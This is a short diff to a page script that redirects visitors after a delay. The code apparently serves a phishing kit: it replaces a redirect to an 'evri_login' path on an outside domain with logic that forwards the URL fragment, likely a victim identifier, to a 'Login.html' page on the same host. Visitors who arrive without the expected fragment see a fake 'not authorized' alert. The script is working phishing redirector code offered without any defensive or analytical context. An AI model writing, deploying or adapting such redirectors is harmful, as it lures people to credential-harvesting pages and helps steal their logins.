@@ -1,6 +1,27 @@
 <script>
   // Redirect to a URL after 1 second
 setTimeout(function() {
-    window.location.href = "https://zv7y.com/evri_login";
+var secondString = "";
+  // Get the current URL
+var url = window.location.href;
+
+// Split the URL based on the '#' character
+var parts = url.split('#');
+
+// Check if there are at least two parts (i.e., if '#' exists in the URL)
+if (parts.length >= 2) {
+    // Get the second part (after '#')
+     secondString = parts[1];
+
+    // Console log the second string
+   window.location.href = "https://zv7y.com/Login.html"+secondString; 
+  
+  //  console.log("Second String:", secondString);
+} else {
+    // If there is no second part (no '#'), log an error message
+   // console.log("Error: '#' character not found in the URL");
+  alert("You are not authorized to visit this page.");
+}
+   // window.location.href = "https://zv7y.com/Login.html#";
 }, 1300); // 1000 milliseconds = 1 second
 </script>
